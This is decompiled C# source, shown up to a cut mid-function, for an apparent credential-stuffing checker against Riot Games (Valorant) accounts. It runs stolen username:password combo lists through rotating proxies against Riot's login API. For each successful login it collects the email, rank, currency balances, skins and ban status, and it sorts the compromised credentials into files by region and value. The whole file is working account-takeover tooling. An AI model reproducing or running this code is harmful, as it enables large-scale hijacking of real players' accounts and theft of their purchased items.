using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using Colorful;
using Leaf.xNet;
using Newtonsoft.Json.Linq;

// Token: 0x02000002 RID: 2
internal class Checker
{
	// Token: 0x06000001 RID: 1 RVA: 0x00002928 File Offset: 0x00000B28
	private static void AppendFile(string filename, string textToAppend)
	{
		object obj = Checker.obj;
		lock (obj)
		{
			File.AppendAllText(string.Concat(new string[]
			{
				"Results/",
				Checker.ResultsFolder,
				"/",
				filename,
				".txt"
			}), textToAppend + "\n");
		}
	}

	// Token: 0x06000002 RID: 2 RVA: 0x000029A4 File Offset: 0x00000BA4
	public static void Start(string[] combos, List<string> proxies, int threads)
	{
		for (int index = 0; index < combos.Length; index++)
		{
			bool flag = combos[index].Split(new char[] { ':', ';', '|' }).Length == 2;
			if (flag)
			{
				Checker.Combos.Enqueue(combos[index]);
			}
		}
		Checker.LoadedCombos = Checker.Combos.Count;
		ConsoleUtilities.Write(string.Format("Loaded {0} combos.\n", Checker.Combos.Count), MsgType.OUTPUT);
		Checker.Proxies = proxies;
		Checker.LoadedProxies = proxies.Count;
		ConsoleUtilities.Write(string.Format("Loaded {0} proxies.\n", proxies.Count), MsgType.OUTPUT);
		bool flag2 = !Directory.Exists("Results");
		if (flag2)
		{
			Directory.CreateDirectory("Results");
		}
		bool flag3 = !Directory.Exists("Results/" + Checker.ResultsFolder);
		if (flag3)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder);
		}
		bool flag4 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Verified");
		if (flag4)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified");
		}
		bool flag5 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Unverified");
		if (flag5)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified");
		}
		bool flag6 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Unverified/NA");
		if (flag6)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/NA");
		}
		bool flag7 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Unverified/AP");
		if (flag7)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/AP");
		}
		bool flag8 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Unverified/EU");
		if (flag8)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/EU");
		}
		bool flag9 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Unverified/KR");
		if (flag9)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Unverified/KR");
		}
		bool flag10 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Verified/NA");
		if (flag10)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/NA");
		}
		bool flag11 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Verified/AP");
		if (flag11)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/AP");
		}
		bool flag12 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Verified/EU");
		if (flag12)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/EU");
		}
		bool flag13 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Verified/KR");
		if (flag13)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Verified/KR");
		}
		bool flag14 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Ranks");
		if (flag14)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Ranks");
		}
		bool flag15 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Ranks/Verified");
		if (flag15)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Ranks/Verified");
		}
		bool flag16 = !Directory.Exists("Results/" + Checker.ResultsFolder + "/Ranks/Unverified");
		if (flag16)
		{
			Directory.CreateDirectory("Results/" + Checker.ResultsFolder + "/Ranks/Unverified");
		}
		Thread.Sleep(2000);
		Colorful.Console.Clear();
		StartMenu.Title();
		new Thread(delegate()
		{
			Checker.ConsoleUpdate();
		}).Start();
		for (int index2 = 0; index2 < threads; index2++)
		{
			Checker.Threads.Add(new Thread(new ThreadStart(Checker.Check)));
			Checker.Threads[index2].Start();
		}
		for (int index3 = 0; index3 < Checker.Threads.Count; index3++)
		{
			Checker.Threads[index3].Join();
		}
	}

	// Token: 0x06000003 RID: 3 RVA: 0x00002E64 File Offset: 0x00001064
	public static void Check()
	{
		List<object> objectList = new List<object>();
		string str = "";
		while (Checker.Combos.Count != 0)
		{
			using (HttpRequest httpRequest = new HttpRequest())
			{
				string result;
				Checker.Combos.TryDequeue(out result);
				bool flag = result != null;
				if (flag)
				{
					bool flag2 = Checker.ProxiesIndex > Checker.LoadedProxies - 2;
					if (flag2)
					{
						Checker.ProxiesIndex = 0;
					}
					try
					{
						Interlocked.Increment(ref Checker.ProxiesIndex);
						bool flag3 = Program.ProxyType == "HTTP";
						if (flag3)
						{
							httpRequest.Proxy = HttpProxyClient.Parse(Checker.Proxies[Checker.ProxiesIndex]);
						}
						bool flag4 = Program.ProxyType == "SOCKS4";
						if (flag4)
						{
							httpRequest.Proxy = Socks4ProxyClient.Parse(Checker.Proxies[Checker.ProxiesIndex]);
						}
						bool flag5 = Program.ProxyType == "SOCKS5";
						if (flag5)
						{
							httpRequest.Proxy = Socks5ProxyClient.Parse(Checker.Proxies[Checker.ProxiesIndex]);
						}
						bool flag6 = Program.ProxyType == "NONE";
						if (flag6)
						{
							httpRequest.Proxy = null;
						}
						string str2 = "{\"acr_values\":\"urn:riot:bronze\",\"claims\":\"\",\"client_id\":\"riot-client\",\"nonce\":\"oYnVwCSrlS5IHKh7iI17oQ\",\"redirect_uri\":\"http://localhost/redirect\",\"response_type\":\"token id_token\",\"scope\":\"openid link ban lol_region\"}";
						httpRequest.AddHeader(HttpHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
						httpRequest.AddHeader(HttpHeader.Accept, "*");
						httpRequest.Post("https://auth.riotgames.com/api/v1/authorization", str2, "application/json");
						httpRequest.AddHeader(HttpHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
						httpRequest.AddHeader(HttpHeader.Accept, "*/*");
						string data = httpRequest.Put("https://auth.riotgames.com/api/v1/authorization", string.Concat(new string[]
						{
							"{\"type\":\"auth\",\"username\":\"",
							result.Split(new char[] { ':', ';', '|' })[0].Replace(" ", ""),
							"\",\"password\":\"",
							result.Split(new char[] { ':', ';', '|' })[1].Replace(" ", ""),
							"\",\"remember\":false,\"language\":\"en_US\"}"
						}), "application/json").ToString();
						bool flag7 = data.Contains("access_token");
						if (flag7)
						{
							Checker.Valid++;
							Checker.CPM_aux++;
							Checker.done++;
							Checker.AppendFile("ValidUserPass", result);
							try
							{
								string str3 = Utils.LRParse(data, "token=", "&scop", false, false);
								httpRequest.AddHeader("Content-Type", "application/json");
								httpRequest.AddHeader("Authorization", "Bearer " + str3);
								string str4 = Utils.LRParse(httpRequest.Post("https://entitlements.auth.riotgames.com/api/token/v1").ToString(), "entitlements_token\":\"", "\"", false, false);
								httpRequest.AddHeader("Content-Type", "application/json");
								httpRequest.AddHeader("Authorization", "Bearer " + str3);
								string data2 = httpRequest.Post("https://auth.riotgames.com/userinfo").ToString();
								string str5 = Utils.LRParse(data2, "sub\":\"", "\"", false, false);
								string str6 = Utils.LRParse(data2, "tag_line\":\"", "\"", false, false);
								string str7 = Utils.LRParse(data2, "game_name\":\"", "\",", false, false);
								string str8 = Utils.LRParse(data2, "created_at\":", "},", false, false);
								string str9 = Utils.LRParse(data2, "country\":\"", "\"", false, false);
								string str10 = Utils.LRParse(data2, "original_platform_id\":\"", "\",", false, false);
								string empty = string.Empty;
								string str11 = Utils.smethod_0(Convert.ToInt64(str8)).ToString();
								bool flag8 = data2.Contains("{\"type\":\"PERMANENT_BAN");
								if (flag8)
								{
									Checker.Banned++;
									Checker.CheckPerSec++;
									Checker.done++;
									try
									{
										Checker.AppendFile("Banned", result);
									}
									catch
									{
									}
								}
								string str12 = "";
								bool flag9 = str10.Contains("BR1");
								if (flag9)
								{
									str12 = "br";
								}
								bool flag10 = str10.Contains("EUN1");
								if (flag10)
								{
									str12 = "eu";
								}
								bool flag11 = str10.Contains("EUW1");
								if (flag11)
								{
									str12 = "eu";
								}
								bool flag12 = str10.Contains("JP1");
								if (flag12)
								{
									str12 = "ap";
								}
								bool flag13 = str10.Contains("KR");
								if (flag13)
								{
									str12 = "kr";
								}
								bool flag14 = str10.Contains("LA1");
								if (flag14)
								{
									str12 = "na";
								}
								bool flag15 = str10.Contains("LA2");
								if (flag15)
								{
									str12 = "na";
								}
								bool flag16 = str10.Contains("NA1");
								if (flag16)
								{
									str12 = "na";
								}
								bool flag17 = str10.Contains("OC1");
								if (flag17)
								{
									str12 = "ap";
								}
								bool flag18 = str10.Contains("PBE");
								if (flag18)
								{
									str12 = "na";
								}
								bool flag19 = str10.Contains("RU");
								if (flag19)
								{
									str12 = "eu";
								}
								bool flag20 = str10.Contains("TR");
								if (flag20)
								{
									str12 = "eu";
								}
								string str13 = "";
								bool flag21 = str9.Contains("phl");
								if (flag21)
								{
									str13 = "ap";
								}
								bool flag22 = str9.Contains("svk");
								if (flag22)
								{
									str13 = "eu";
								}
								bool flag23 = str9.Contains("lan");
								if (flag23)
								{
									str13 = "na";
								}
								bool flag24 = str9.Contains("svn");
								if (flag24)
								{
									str13 = "eu";
								}
								bool flag25 = str9.Contains("zaf");
								if (flag25)
								{
									str13 = "eu";
								}
								bool flag26 = str9.Contains("alb");
								if (flag26)
								{
									str13 = "eu";
								}
								bool flag27 = str9.Contains("arg");
								if (flag27)
								{
									str13 = "na";
								}
								bool flag28 = str9.Contains("aus");
								if (flag28)
								{
									str13 = "ap";
								}
								bool flag29 = str9.Contains("aut");
								if (flag29)
								{
									str13 = "eu";
								}
								bool flag30 = str9.Contains("bel");
								if (flag30)
								{
									str13 = "eu";
								}
								bool flag31 = str9.Contains("bih");
								if (flag31)
								{
									str13 = "eu";
								}
								bool flag32 = str9.Contains("bra");
								if (flag32)
								{
									str13 = "br";
								}
								bool flag33 = str9.Contains("bgr");
								if (flag33)
								{
									str13 = "eu";
								}
								bool flag34 = str9.Contains("can");
								if (flag34)
								{
									str13 = "na";
								}
								bool flag35 = str9.Contains("chl");
								if (flag35)
								{
									str13 = "na";
								}
								bool flag36 = str9.Contains("cri");
								if (flag36)
								{
									str13 = "na";
								}
								bool flag37 = str9.Contains("hrv");
								if (flag37)
								{
									str13 = "eu";
								}
								bool flag38 = str9.Contains("cyp");
								if (flag38)
								{
									str13 = "eu";
								}
								bool flag39 = str9.Contains("cze");
								if (flag39)
								{
									str13 = "eu";
								}
								bool flag40 = str9.Contains("dnk");
								if (flag40)
								{
									str13 = "eu";
								}
								bool flag41 = str9.Contains("est");
								if (flag41)
								{
									str13 = "eu";
								}
								bool flag42 = str9.Contains("fin");
								if (flag42)
								{
									str13 = "eu";
								}
								bool flag43 = str9.Contains("fra");
								if (flag43)
								{
									str13 = "eu";
								}
								bool flag44 = str9.Contains("geo");
								if (flag44)
								{
									str13 = "eu";
								}
								bool flag45 = str9.Contains("deu");
								if (flag45)
								{
									str13 = "eu";
								}
								bool flag46 = str9.Contains("grc");
								if (flag46)
								{
									str13 = "eu";
								}
								bool flag47 = str9.Contains("hkg");
								if (flag47)
								{
									str13 = "ap";
								}
								bool flag48 = str9.Contains("hun");
								if (flag48)
								{
									str13 = "eu";
								}
								bool flag49 = str9.Contains("isl");
								if (flag49)
								{
									str13 = "eu";
								}
								bool flag50 = str9.Contains("isr");
								if (flag50)
								{
									str13 = "eu";
								}
								bool flag51 = str9.Contains("ind");
								if (flag51)
								{
									str13 = "ap";
								}
								bool flag52 = str9.Contains("idn");
								if (flag52)
								{
									str13 = "ap";
								}
								bool flag53 = str9.Contains("irl");
								if (flag53)
								{
									str13 = "eu";
								}
								bool flag54 = str9.Contains("ita");
								if (flag54)
								{
									str13 = "eu";
								}
								bool flag55 = str9.Contains("jpn");
								if (flag55)
								{
									str13 = "ap";
								}
								bool flag56 = str9.Contains("iva");
								if (flag56)
								{
									str13 = "";
								}
								bool flag57 = str9.Contains("eu");
								if (flag57)
								{
									str13 = "";
								}
								bool flag58 = str9.Contains("lux");
								if (flag58)
								{
									str13 = "eu";
								}
								bool flag59 = str9.Contains("mys");
								if (flag59)
								{
									str13 = "ap";
								}
								bool flag60 = str9.Contains("mda");
								if (flag60)
								{
									str13 = "eu";
								}
								bool flag61 = str9.Contains("nld");
								if (flag61)
								{
									str13 = "eu";
								}
								bool flag62 = str9.Contains("mkd");
								if (flag62)
								{
									str13 = "eu";
								}
								bool flag63 = str9.Contains("nor");
								if (flag63)
								{
									str13 = "eu";
								}
								bool flag64 = str9.Contains("pol");
								if (flag64)
								{
									str13 = "eu";
								}
								bool flag65 = str9.Contains("prt");
								if (flag65)
								{
									str13 = "eu";
								}
								bool flag66 = str9.Contains("rou");
								if (flag66)
								{
									str13 = "eu";
								}
								bool flag67 = str9.Contains("ru");
								if (flag67)
								{
									str13 = "eu";
								}
								bool flag68 = str9.Contains("srb");
								if (flag68)
								{
									str13 = "eu";
								}
								bool flag69 = str9.Contains("sgp");
								if (flag69)
								{
									str13 = "ap";
								}
								bool flag70 = str9.Contains("svk");
								if (flag70)
								{
									str13 = "eu";
								}
								bool flag71 = str9.Contains("svn");
								if (flag71)
								{
									str13 = "eu";
								}
								bool flag72 = str9.Contains("zaf");
								if (flag72)
								{
									str13 = "eu";
								}
								bool flag73 = str9.Contains("esp");
								if (flag73)
								{
									str13 = "eu";
								}
								bool flag74 = str9.Contains("swe");
								if (flag74)
								{
									str13 = "eu";
								}
								bool flag75 = str9.Contains("che");
								if (flag75)
								{
									str13 = "eu";
								}
								bool flag76 = str9.Contains("twn");
								if (flag76)
								{
									str13 = "ap";
								}
								bool flag77 = str9.Contains("tha");
								if (flag77)
								{
									str13 = "ap";
								}
								bool flag78 = str9.Contains("usa");
								if (flag78)
								{
									str13 = "na";
								}
								bool flag79 = str9.Contains("tur");
								if (flag79)
								{
									str13 = "eu";
								}
								bool flag80 = str9.Contains("gbr");
								if (flag80)
								{
									str13 = "eu";
								}
								bool flag81 = str9.Contains("ukr");
								if (flag81)
								{
									str13 = "eu";
								}
								bool flag82 = str9.Contains("vnm");
								if (flag82)
								{
									str13 = "ap";
								}
								bool flag83 = string.IsNullOrEmpty(str13);
								if (flag83)
								{
									str13 = str12;
								}
								bool flag84 = str13.Contains("ap");
								if (flag84)
								{
									Checker.AP++;
								}
								bool flag85 = str13.Contains("na");
								if (flag85)
								{
									Checker.NA++;
								}
								bool flag86 = str13.Contains("kr");
								if (flag86)
								{
									Checker.KR++;
								}
								bool flag87 = str13.Contains("eu");
								if (flag87)
								{
									Checker.EU++;
								}
								bool flag88 = str13.Contains("br");
								if (flag88)
								{
									Checker.NA++;
								}
								bool flag89 = str13.Contains("latam");
								if (flag89)
								{
									Checker.NA++;
								}
								httpRequest.AddHeader("Authorization", "Bearer " + str3);
								httpRequest.AddHeader("X-Riot-Entitlements-JWT", str4);
								httpRequest.AddHeader("X-Riot-ClientVersion", "release-04.07-shipping-13-697073");
								httpRequest.AddHeader("X-Riot-ClientPlatform", "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9");
								JObject jobject = JObject.Parse(httpRequest.Get(string.Concat(new string[] { "https://pd.", str13, ".a.pvp.net/store/v1/entitlements/", str5, "/e7c63390-eda7-46e0-bb7a-a6abdacd2433" }), null).ToString());
								List<JToken> list = jobject["Entitlements"].ToList<JToken>();
								int count = list.Count;
								Enumerable.Range(1, list.Count);
								string str14 = httpRequest.Get("https://raw.githubusercontent.com/CARRYYME/TharwaTSkins/main/9Um", null).ToString();
								List<string> stringList = new List<string>();
								string[] strArray = str14.ToString().Split(new char[] { '\n' });
								int num = 0;
								try
								{
									for (int key = 1; key < list.Count; key++)
									{
										JToken jtoken = jobject["Entitlements"][key]["ItemID"];
										foreach (string str15 in strArray)
										{
											bool flag90 = str15.ToString().Contains(jtoken.ToString().ToUpper());
											if (flag90)
											{
												string str16 = string.Empty;
												string str17 = str15.ToString().Split(new char[] { '|' })[0];
												bool flag91 = !str17.ToLower().Contains("level");
												if (flag91)
												{
													num++;
													string str18 = str17.Replace("Name:", "");
													str = string.Concat(new string[]
													{
														str,
														"[",
														num.ToString(),
														"]",
														str18,
														"\n"
													});
												}
											}
										}
									}
								}
								catch
								{
								}
								httpRequest.AddHeader("Authorization", "Bearer " + str3);
								httpRequest.AddHeader("X-Riot-Entitlements-JWT", str4);
								httpRequest.AddHeader("X-Riot-ClientPlatform", "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9");
								httpRequest.AddHeader("X-Riot-ClientVersion", "release-04.05-shipping-23-687347");
								string str19 = Utils.LRParse(httpRequest.Get(string.Concat(new string[] { "https://pd.", str13, ".a.pvp.net/mmr/v1/players/", str5, "/competitiveupdates?startIndex=0&endIndex=1&queue=competitive" }), null).ToString(), "TierAfterUpdate\":", ",\"", false, false);
								string str20 = "";
								bool flag92 = str19.Contains("0");
								if (flag92)
								{
									str20 = "Unrated";
								}
								bool flag93 = str19.Contains("1");
								if (flag93)
								{
									str20 = "Unknown";
								}
								bool flag94 = str19.Contains("2");
								if (flag94)
								{
									str20 = "Unknown";
								}
								bool flag95 = str19.Contains("3");
								if (flag95)
								{
									str19 = "Iron 1 ";
								}
								bool flag96 = str19.Contains("4");
								if (flag96)
								{
									str20 = "Iron 2 ";
								}
								bool flag97 = str19.Contains("5");
								if (flag97)
								{
									str20 = "Iron 3 ";
								}
								bool flag98 = str19.Contains("6");
								if (flag98)
								{
									str20 = "Bronze 1";
								}
								bool flag99 = str19.Contains("7");
								if (flag99)
								{
									str20 = "Bronze 2";
								}
								bool flag100 = str19.Contains("8");
								if (flag100)
								{
									str20 = "Bronze 3";
								}
								bool flag101 = str19.Contains("9");
								if (flag101)
								{
									str20 = "Silver 1";
								}
								bool flag102 = str19.Contains("10");
								if (flag102)
								{
									str20 = "Silver 2";
								}
								bool flag103 = str19.Contains("11");
								if (flag103)
								{
									str20 = "Silver 3";
								}
								bool flag104 = str19.Contains("12");
								if (flag104)
								{
									str20 = "Gold 1";
								}
								bool flag105 = str19.Contains("13");
								if (flag105)
								{
									str20 = "Gold 2";
								}
								bool flag106 = str19.Contains("14");
								if (flag106)
								{
									str20 = "Gold 3";
								}
								bool flag107 = str19.Contains("15");
								if (flag107)
								{
									str20 = "Platinum 1";
								}
								bool flag108 = str19.Contains("16");
								if (flag108)
								{
									str20 = "Platinum 2";
								}
								bool flag109 = str19.Contains("17");
								if (flag109)
								{
									str20 = "Platinum 3";
								}
								bool flag110 = str19.Contains("18");
								if (flag110)
								{
									str20 = "Diamond 1";
								}
								bool flag111 = str19.Contains("19");
								if (flag111)
								{
									str20 = "Diamond 2";
								}
								bool flag112 = str19.Contains("20");
								if (flag112)
								{
									str20 = "Diamond 3";
								}
								bool flag113 = str19.Contains("21");
								if (flag113)
								{
									str20 = "Immortal 1";
								}
								bool flag114 = str19.Contains("22");
								if (flag114)
								{
									str20 = "Immortal 2";
								}
								bool flag115 = str19.Contains("23");
								if (flag115)
								{
									str20 = "Immortal 3";
								}
								bool flag116 = str19.Contains("24");
								if (flag116)
								{
									str20 = "Radiant";
								}
								bool flag117 = string.IsNullOrEmpty(str20);
								if (flag117)
								{
									str20 = "Unrated";
								}
								httpRequest.AddHeader("Content-Type", "application/json");
								httpRequest.AddHeader("Authorization", "Bearer " + str3);
								string data3 = httpRequest.Get("https://email-verification.riotgames.com/api/v1/account/status", null).ToString();
								string str21 = Utils.LRParse(data3, "emailVerified\":", "}", false, false);
								string str22 = Utils.LRParse(data3, "email\":\"", "\"", false, false);
								httpRequest.AddHeader("Authorization", "Bearer " + str3);
								httpRequest.AddHeader("X-Riot-Entitlements-JWT", str4);
								httpRequest.AddHeader("X-Riot-ClientVersion", "release-04.05-shipping-23-687347");
								httpRequest.AddHeader("X-Riot-ClientPlatform", "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9");
								string str23 = Utils.LRParse(httpRequest.Get("https://pd." + str13 + ".a.pvp.net/match-history/v1/history/" + str5, null).ToString(), "GameStartTime\":", ",", false, false);
								string empty2 = string.Empty;
								string str24 = Utils.smethod_0(Convert.ToInt64(str23)).ToString();
								httpRequest.AddHeader("Authorization", "Bearer " + str3);
								httpRequest.AddHeader("X-Riot-Entitlements-JWT", str4);
								httpRequest.AddHeader("X-Riot-ClientVersion", "release-04.05-shipping-23-687347");
								string json = httpRequest.Get("https://pd." + str13 + ".a.pvp.net/store/v1/wallet/" + str5, null).ToString();
								JObject jobject2 = JObject.Parse(json);
								object obj = jobject2["Balances"]["85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741"];
								object obj2 = jobject2["Balances"]["e59aa87c-4cbf-517a-5983-6e81511be9b7"];
								bool flag118 = string.IsNullOrEmpty(json);
								if (flag118)
								{
									obj = "Unknown";
									obj2 = "Unknown";
								}
								string textToAppend = string.Concat(new string[]
								{
									"===================================\nLogin: ",
									result,
									"\nRegion/Country: ",
									str13,
									"/",
									str9,
									"\nGamename: ",
									str7,
									"#",
									str6,
									"\nEmail: ",
									str22,
									"\nVerified: ",
									str21,
									"\nCreation Date: ",
									str11,
									"\nLast Played:",
									str24,
									"\nRank: ",
									str20.ToString(),
									"\nValorant Points: ",
									obj.ToString(),
									"  Radianite: ",
									obj2.ToString(),
									"\nTotal Skin:[",
									num.ToString(),
									"]\n===============Skins===============\n",
									str,
									"==================================="
								});
								bool flag119 = num < 0;
								if (flag119)
								{
									Checker.unskinned++;
								}
								bool flag120 = num > 1;
								if (flag120)
								{
									Checker.Skinned++;
								}
								bool flag121 = num > 1;
								if (flag121)
								{
									Checker.AppendFile("SkinnedUserPass", result);
								}
								bool flag122 = num > 1;
								if (flag122)
								{
									Checker.AppendFile("SkinnedHits", textToAppend);
								}
								bool flag123 = num < 0;
								if (flag123)
								{
									Checker.AppendFile("Unskinned", textToAppend);
								}
								bool flag124 = num < 0;
								if (flag124)
								{
									Checker.AppendFile("UnskinnedUserPass", result);
								}
								bool flag125 = num > 0 && num < 10;
								if (flag125)
								{
									Checker.ten++;
								}
								bool flag126 = num > 10 && num < 20;
								if (flag126)
								{
									Checker.twenty++;
								}
								bool flag127 = num > 20 && num < 30;
								if (flag127)
								{
									Checker.thirty++;
								}
								bool flag128 = num > 30 && num <= 50;
								if (flag128)
								{
									Checker.fifty++;
								}
								bool flag129 = num > 50 && num < 80;
								if (flag129)
								{
									Checker.eighty++;
								}
								bool flag130 = num > 80 && num < 100;
								if (flag130)
								{
									Checker.hundred++;
								}
								bool flag131 = num > 100 && num < 150;
								if (flag131)
								{
									Checker.hundred1++;
								}
								bool flag132 = num > 150 && num < 200;
								if (flag132)
								{
									Checker.hundred2++;
								}
								bool flag133 = num > 200;
								if (flag133)
								{
									Checker.hundred3++;
								}
								bool flag134 = str21.Contains("true") && str20.Contains("Unknown");
								if (flag134)
								{
									Checker.unknown++;
									try
									{
										Checker.RanksV("Unknown", textToAppend);
									}
									catch
									{
									}
								}
								bool flag135 = str21.Contains("true") && str20.Contains("Unranked");
								if (flag135)
								{
									Checker.unrated++;
									try
									{
										Checker.RanksV("Unrated", textToAppend);
									}
									catch
									{
									}
								}
								bool flag136 = str21.Contains("true") && str20.Contains("Iron");
								if (flag136)
								{
									Checker.iron++;
									try
									{
										Checker.RanksV("Iron", textToAppend);
									}
									catch
									{
									}
								}
								bool flag137 = str21.Contains("true") && str20.Contains("Bronze");
								if (flag137)
								{
									Checker.bronze++;
									try
									{
										Checker.RanksV("Bronze", textToAppend);
									}
									catch
									{
									}
								}
								bool flag138 = str21.Contains("true") && str20.Contains("Silver");
								if (flag138)
								{
									Checker.silver++;
									try
									{
										Checker.RanksV("Silver", textToAppend);
									}
									catch
									{
									}
								}
								bool flag139 = str21.Contains("true") && str20.Contains("Gold");
								if (flag139)
								{
									Checker.gold++;
									try
									{
										Checker.RanksV("Gold", textToAppend);
									}
									catch
									{
									}
								}
								bool flag140 = str21.Contains("true") && str20.Contains("Platinum");
								if (flag140)
								{
									Checker.plat++;
									try
									{
										Checker.RanksV("Platinum", textToAppend);
									}
									catch
									{
									}
								}
								bool flag141 = str21.Contains("true") && str20.Contains("Diamond");
								if (flag141)
								{
									Checker.dia++;
									try
									{
										Checker.RanksV("Diamond", textToAppend);
									}
									catch
									{
									}
								}
								bool flag142 = str21.Contains("true") && str20.Contains("Immortal");
								if (flag142)
								{
									Checker.immo++;
									try
									{
										Checker.RanksV("Immortal", textToAppend);
									}
									catch
									{
									}
								}
								bool flag143 = str21.Contains("true") && str20.Contains("Radiant");
								if (flag143)
								{
									Checker.radiant++;
									try
									{
										Checker.RanksV("Radiant", textToAppend);
									}
									catch
									{
									}
								}
								bool flag144 = str21.Contains("false") && str20.Contains("Unranked");
								if (flag144)
								{
									Checker.unratedu++;
									try
									{
										Checker.RanksU("Unrated", textToAppend);
									}
									catch
									{
									}
								}
								bool flag145 = str21.Contains("false") && str20.Contains("Iron");
								if (flag145)
								{
									Checker.ironu++;
									try
									{
										Checker.RanksU("Iron", textToAppend);
									}
									catch
									{
									}
								}
								bool flag146 = str21.Contains("false") && str20.Contains("Bronze");
								if (flag146)
								{
									Checker.bronzeu++;
									try
									{
										Checker.RanksU("Bronze", textToAppend);
									}
									catch
									{
									}
								}
								bool flag147 = str21.Contains("false") && str20.Contains("Silver");
								if (flag147)
								{
									Checker.silveru++;
									try
									{
										Checker.RanksU("Silver", textToAppend);
									}
									catch
									{
									}
								}
								bool flag148 = str21.Contains("false") && str20.Contains("Gold");
								if (flag148)
								{
									Checker.goldu++;
									try
									{
										Checker.RanksU("Gold", textToAppend);
									}
									catch
									{
									}
								}
								bool flag149 = str21.Contains("false") && str20.Contains("Platinum");
								if (flag149)
								{
									Checker.platu++;
									try
									{
										Checker.RanksU("Platinum", textToAppend);
									}
									catch
									{
									}
								}
								bool flag150 = str21.Contains("false") && str20.Contains("Diamond");
								if (flag150)
								{
									Checker.diau++;
									try
									{
										Checker.RanksU("Diamond", textToAppend);
									}
									catch
									{
									}
								}
								bool flag151 = str21.Contains("false") && str20.Contains("Immortal");
								if (flag151)
								{
									Checker.immou++;
									try
									{
										Checker.RanksU("Immortal", textToAppend);
									}
									catch
									{
									}
								}
								bool flag152 = str21.Contains("false") && str20.Contains("Radiant");
								if (flag152)
								{
									Checker.radiantu++;
									try
									{
										Checker.RanksU("Radiant", textToAppend);
									}
									catch
									{
									}
								}
								bool flag153 = num > 1 && ((num < 10) & str21.Contains("false")) && str13.Contains("na");
								if (flag153)
								{
									Checker.nau10();
									Checker.nas10("1-10", textToAppend);
									Checker.nas10("UserPass", result);
								}
								bool flag154 = num > 10 && ((num < 20) & str21.Contains("false")) && str13.Contains("na");
								if (flag154)
								{
									Checker.nas20("10-20", textToAppend);
									Checker.nas20("UserPass", result);
								}
								bool flag155 = num > 20 && ((num < 30) & str21.Contains("false")) && str13.Contains("na");
								if (flag155)
								{
									Checker.nas30("20-30", textToAppend);
									Checker.nas30("UserPass", result);
								}
								bool flag156 = num > 30 && ((num < 50) & str21.Contains("false")) && str13.Contains("na");
								if (flag156)
								{
									Checker.nau50();
									Checker.nas50("30-50", textToAppend);
									Checker.nas50("UserPass", result);
								}
								bool flag157 = num > 50 && ((num < 80) & str21.Contains("false")) && str13.Contains("na");
								if (flag157)
								{
									Checker.nau80();
									Checker.nas80("50-80", textToAppend);
									Checker.nas80("UserPass", result);
								}
								bool flag158 = num > 80 && ((num < 100) & str21.Contains("false")) && str13.Contains("na");
								if (flag158)
								{
									Checker.nau100();
									Checker.nas100("80-100", textToAppend);
									Checker.nas100("UserPass", result);
								}
								bool flag159 = num > 100 && ((num < 150) & str21.Contains("false")) && str13.Contains("na");
								if (flag159)
								{
									Checker.nau150();
									Checker.nas150("100-150", textToAppend);
									Checker.nas150("UserPass", result);
								}
								bool flag160 = num > 150 && ((num < 200) & str21.Contains("false")) && str13.Contains("na");
								if (flag160)
								{
									Checker.nau200();
									Checker.nas200("150-200", textToAppend);
									Checker.nas200("UserPass", result);
								}
								bool flag161 = num > 200 && ((num < 1000) & str21.Contains("false")) && str13.Contains("na");
								if (flag161)
								{
									Checker.nau250();
									Checker.nas2000("200++", textToAppend);
									Checker.nas2000("UserPass", result);
								}
								bool flag162 = num > 1 && ((num < 10) & str21.Contains("false")) && str13.Contains("ap");
								if (flag162)
								{
									Checker.apu10();
									Checker.apb10("1-10", textToAppend);
									Checker.apb10("UserPass", result);
								}
